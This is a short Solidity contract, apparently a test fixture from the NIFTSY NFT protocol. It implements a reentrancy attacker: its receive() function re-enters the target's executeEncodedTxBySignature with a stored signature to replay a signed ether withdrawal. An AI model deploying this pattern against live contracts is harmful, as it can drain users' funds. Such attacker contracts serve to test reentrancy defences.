// SPDX-License-Identifier: MIT
// NIFTSY protocol for NFT
pragma solidity ^0.8.20;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";

contract ReentrancyAttacker3 {
    using Address for address;

    address public immutable wnfAddress;
    bytes public signature;

    constructor(address _wnft) {
        wnfAddress = _wnft;
    }

    receive() external payable virtual {
        wnfAddress.functionCallWithValue(
            abi.encodeWithSignature(
                "executeEncodedTxBySignature(address,uint256,bytes,bytes)", address(this), 1e18, "", signature
            ),
            0 //value
        );
    }

    function setSignature(bytes memory _signature) external {
        signature = _signature;
    }

    function claimEther(uint256 _eth) external {
        wnfAddress.functionCallWithValue(
            abi.encodeWithSignature(
                "executeEncodedTxBySignature(address,uint256,bytes,bytes)", address(this), _eth, "", signature
            ),
            0
        );
    }
}
